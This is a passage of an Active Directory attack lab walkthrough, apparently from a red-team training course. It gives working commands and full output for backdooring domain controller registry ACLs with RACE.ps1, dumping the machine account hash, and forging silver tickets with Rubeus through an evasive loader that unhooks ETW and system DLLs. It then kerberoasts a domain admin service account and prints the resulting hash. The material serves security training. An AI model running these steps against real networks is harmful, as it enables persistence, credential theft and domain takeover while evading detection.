VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating the trustee WMI object with user 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Creating the trustee WMI object with user 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Creating the trustee WMI object with user 'student731'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Applying Trustee to new Ace
The property 'DACL' cannot be found on this object. Verify that the property exists and can be set.
At C:\AD\Tools\RACE.ps1:2268 char:13
+             $RegSD.DACL += $RegAce.PSObject.ImmediateBaseObject
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : PropertyNotFound

VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Backdooring completed for system

ComputerName                        BackdoorTrustee
------------                        ---------------
dcorp-dc.dollarcorp.moneycorp.local student731
```

### Now, we can retreive hash as student731

### Run as a normal user
* PS C:\AD\Tools> . C:\AD\Tools\RACE.ps1
* PS C:\AD\Tools> Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```
VERBOSE: Bootkey/SysKey : BAB78ACD91795C983AEF0534E0DB38C7
VERBOSE: LSA Key        : BDC807FEC0BB38EB0AE338451573904220F8B69404F719BDDB03F8618E84005C

ComputerName MachineAccountHash
------------ ------------------
dcorp-dc     0ae0d8c01b5e2b77632a5e6cd0e213c9
```

### We can use the machine account hash to create Silver Tickets. 
### Create Silver Tickets for HOST and RPCSS using the machine account hash to execute WMI queries

* C:\Windows\System32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:0ae0d8c01b5e2b77632a5e6cd0e213c9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:0ae0d8c01b5e2b77632a5e6cd0e213c9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
[*] Action: Build TGS

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted
[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 0AE0D8C01B5E2B77632A5E6CD0E213C9
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 0AE0D8C01B5E2B77632A5E6CD0E213C9
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : host
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator' to 'host/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 9/28/2025 7:06:55 AM
[*] StartTime      : 9/28/2025 7:06:55 AM
[*] EndTime        : 9/28/2025 5:06:55 PM
[*] RenewTill      : 10/5/2025 7:06:55 AM

[*] base64(ticket.kirbi):

      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
      cnAubW9uZXljb3JwLmxvY2Fs

[+] Ticket successfully imported!
```

* C:\Windows\System32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:0ae0d8c01b5e2b77632a5e6cd0e213c9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:0ae0d8c01b5e2b77632a5e6cd0e213c9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
[*] Action: Build TGS

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 0AE0D8C01B5E2B77632A5E6CD0E213C9
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 0AE0D8C01B5E2B77632A5E6CD0E213C9
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : rpcss
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator' to 'rpcss/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 9/28/2025 7:10:16 AM
[*] StartTime      : 9/28/2025 7:10:16 AM
[*] EndTime        : 9/28/2025 5:10:16 PM
[*] RenewTill      : 10/5/2025 7:10:16 AM

[*] base64(ticket.kirbi):

      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
      Y29ycC5tb25leWNvcnAubG9jYWw=

[+] Ticket successfully imported!
```

* PS C:\AD\Tools> gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

### Learning Objective 14:
```
• Using the Kerberoasting attack, crack password of a SQL server service account
```

### First, we need to find services running with user accounts as the services running with machine accounts have difficult passwords.
### We can use PowerView or ActiveDirectory module for discovering such services:

* C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\AD\Tools>. C:\AD\Tools\PowerView.ps1
* PS C:\AD\Tools> Get-DomainUser -SPN

```
pwdlastset                    : 11/11/2022 9:59:41 PM
logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user}
showinadvancedviewonly        : True
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 11/12/2022 6:14:52 AM
instancetype                  : 4
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
objectguid                    : 956ae091-be8d-49da-966b-0daa8d291bb2
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 11/12/2022 5:59:41 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {9/28/2025 2:49:55 PM, 9/28/2025 1:49:55 PM, 9/23/2025 12:06:50 PM, 8/20/2025 12:07:28 PM...}
serviceprincipalname          : kadmin/changepw
usncreated                    : 12300
usnchanged                    : 12957
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
lastlogon                     : 12/31/1600 4:00:00 PM
badpwdcount                   : 0
cn                            : krbtgt
msds-supportedencryptiontypes : 0
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-502
primarygroupid                : 513
iscriticalsystemobject        : True
name                          : krbtgt

logoncount               : 5
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 10/25/2024 3:37:34 AM
userprincipalname        : websvc
whencreated              : 11/14/2022 12:42:13 PM
samaccountname           : websvc
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 10/25/2024 10:37:34 AM
instancetype             : 4
usncreated               : 38071
objectguid               : b7ab147c-f929-4ad2-82c9-7e1b656492fe
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {12/5/2024 12:47:28 PM, 11/14/2022 12:42:13 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
usnchanged               : 255349
lastlogon                : 10/25/2024 3:37:34 AM
badpwdcount              : 0
cn                       : web svc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
objectsid                : S-1-5-21-719815819-3726368948-3917688648-1114
primarygroupid           : 513
pwdlastset               : 11/14/2022 4:42:13 AM
name                     : web svc

logoncount            : 37
badpasswordtime       : 11/25/2022 4:20:42 AM
description           : Account to be used for services which need high privileges.
distinguishedname     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : svc admin
lastlogontimestamp    : 9/28/2025 6:15:18 AM
userprincipalname     : svcadmin
samaccountname        : svcadmin
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 9/28/2025 1:15:18 PM
instancetype          : 4
usncreated            : 40118
objectguid            : 244f9c84-7e33-4ed6-aca1-3328d0802db0
sn                    : admin
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 11/14/2022 5:06:37 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {9/28/2025 2:49:55 PM, 9/28/2025 1:49:55 PM, 9/23/2025 12:06:50 PM, 8/20/2025 12:07:27 PM...}
serviceprincipalname  : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
givenname             : svc
usnchanged            : 348166
memberof              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
lastlogon             : 9/28/2025 6:15:18 AM
badpwdcount           : 0
cn                    : svc admin
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-719815819-3726368948-3917688648-1118
primarygroupid        : 513
pwdlastset            : 11/14/2022 9:06:37 AM
name                  : svc admin
```

### The svcadmin, which is a domain administrator has a SPN set! Let's Kerberoast it!

### Rubeus and John the Ripper
We can use Rubeus to get hashes for the svcadmin account. 
Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if 'This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes.

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : svcadmin
[*] Target Domain          : dollarcorp.moneycorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\hashes.txt
```

### Read file hashes.txt

* C:\AD\Tools>type hashes.txt
```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*$C18A29F02C25C2DDCF25F809804D86B7$4A94FA3E6D84B69D18721F2E8908AB08CFFC1E7A2D6DE488752123E9E5957A13B47308CCE53D7796F0C1138CC320C2CBE1FE9C4F431EC5FAB35DC42F8DE1C180B8BFA990D7857BCA1445D216368037DD4047D60D26837FDCA597A21A57898F06D24730FB9B47C5EFF27F723A32CD66EA3523D2CF89148843E4EB4D10FF968C9198129A36E85C0E0F79CBDC3CA80E788A68B204F0076F61AF2C14F79EE0E68AC609BCF3079BE4FF489B69860D45C753299BE5F457AC2FCFB88C3F2E4BB2F3A280CF705CAA85645BB3DCE08068B31A0440B5D242B7453579FD9DBC0AF735F14541E489111CC4202B6AD80B54D9B4B9EEA9FEC87D9FC6ABAF8976CFF5FF58F7B2847105FF3DB29DBA39E18A1384BEBB11488E5D2E60696BB787099A6426933198C4DAD238C3C9912D2E463139114706D1A53F6085FE19D7AA5D824CB1A1DC4E6FADB755285C32A1AD4D8108F97FD013DC17997BA746A2A5393B400BA1AA817B013C36BF4253FE8D8C0E6F23A365A3F2EAD80FCBC6A20AB6390C22DA16651778D8E21734E65698C5B248AB1D131C72F54B4446D298AA2AF36A74AAFB06DA038AE3FAA0A7841D5546E2E0F9D817D5E8A79D1AECDA8D404F992686BDA059B6D051E62AF1840756F30A381DEF52976204179EC4E35EB2919B533D72230F5D32AE0B104224EE2786F3F576A5210F8BE4B06A0A38468466A525292216949A443044EB66F63955120445CD32E0B3339F1CB3199D2A0B026BD8CD1627F1E758EEEFD8EEC80CC6204766DF21CC610503AE5E10996597C46F5C332B83CB8B840095ECCAAEE5DDB31E1D39ACEB9E0DED769855E64F94AC5A07C5B4F47B4DFB7EC188CD6FF3896D224E67D350E06225A088D6826CA286E869CDE016EE80967BF6F157A3B1B9CDB69DA15EA9BEE054166CAE02D8EF734E51460BBE209B6E6EB011EED29BCC3458F7E8DDF368B08B2605A2D6F38A47777447E395053CB2FAF9C01EA038E219BB8AE78B7FEC8D3EE427AEF05BA4B159C89E306D8FDA53EB82233461A16816A40AD1444EB54E800051C40FA261CC24E84792C7BE0DB962CD5FAB22750C9AF273734439824F50D7FFD72FF5A82C22F